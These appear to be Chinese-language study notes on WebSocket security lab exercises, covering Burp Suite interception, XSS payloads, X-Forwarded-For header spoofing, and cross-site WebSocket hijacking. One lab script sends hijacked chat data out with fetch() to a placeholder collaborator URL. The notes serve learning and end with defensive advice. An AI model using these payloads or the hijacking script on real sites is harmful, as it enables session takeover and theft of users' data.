# WebSockets
- 透過 HTTP 發起，並提供雙向非同步通訊的長連接
- problem :
  - Browser: XSS / CSRF
  - Server : SQLi / XXE / SSRF
 
# Burp Suite
- 攔截並修改 WebSocket 訊息。
- 重播並產生新的 WebSocket 訊息。
- 操作 WebSocket 連線。

## 使用 Burp Proxy 攔截和修改 WebSocket 訊息
- Intercept : 確保攔截已開啟。
- Repeater : 重播單一訊息並產生新訊息

## 操作 WebSocket 連接
- 使用 Burp Repeater 操縱 WebSocket 握手
- WebSocket URL 旁的鉛筆圖

# WebSockets 安全漏洞
- 使用者提供的輸入 : SQL 注入或 XML 外部實體注入等漏洞
- 盲漏洞 :使用帶外 (OAST) 技術來偵測
- 導致 XSS 或其他用戶端漏洞
- 篡改 WebSocket 訊息的內容來發現和利用

## example 
- WebSocket 訊息 : {"message":"Hello Carlos"}
- 瀏覽器 : <td>Hello Carlos</td>
- XSS 攻擊 : {"message":"<img src=1 onerror='alert(1)'>"}

## Lab: Manipulating WebSocket messages to exploit vulnerabilities
- 點擊「即時聊天」並發送聊天訊息
- Proxy  : WebSockets 歷史記錄
- 使用瀏覽器發送包含字元的新訊息<
- <img src=1 onerror='alert(1)'>

## 操縱 WebSocket 握手來利用漏洞
- 錯誤地信任 HTTP 標頭來執行安全性決策
- X-Forwarded-For標頭

## Lab: Manipulating the WebSocket handshake to exploit vulnerabilities
- X-Forwarded-For: 1.1.1.1
- 混淆的 XSS 有效負載 : <img src=1 oNeRrOr=alert`1`>

## 跨站 WebSocket 劫持攻擊
- 利用 WebSocket 握手過程中的跨站請求偽造 (CSRF) 漏洞
- 當 WebSocket 握手請求僅依賴 HTTP Cookie 進行會話處理，且不包含任何 CSRF 令牌或其他不可預測的值時
- 偽裝成受害者使用者執行未經授權的操作
- 檢索使用者可以存取的敏感資料
- 找到一個僅依賴 HTTP cookie 進行會話處理的握手訊息

      GET /chat HTTP/1.1
      Host: normal-website.com
      Sec-WebSocket-Version: 13
      Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
      Connection: keep-alive, Upgrade
      Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
      Upgrade: websocket

## Lab: Cross-site WebSocket hijacking
    <script>
        var ws = new WebSocket('wss://your-websocket-url');
        ws.onopen = function() {
            ws.send("READY");
        };
        ws.onmessage = function(event) {
            fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
        };
    </script>
- Burp Collaborator

## 如何保護 WebSocket 連接
- 使用wss://協定（TLS 上的 WebSockets）
- 對 WebSockets 端點的 URL 進行硬編碼
- 保護 WebSocket 握手訊息免受 CSRF 攻擊
- 將透過 WebSocket 接收的資料視為雙向不可信資料。
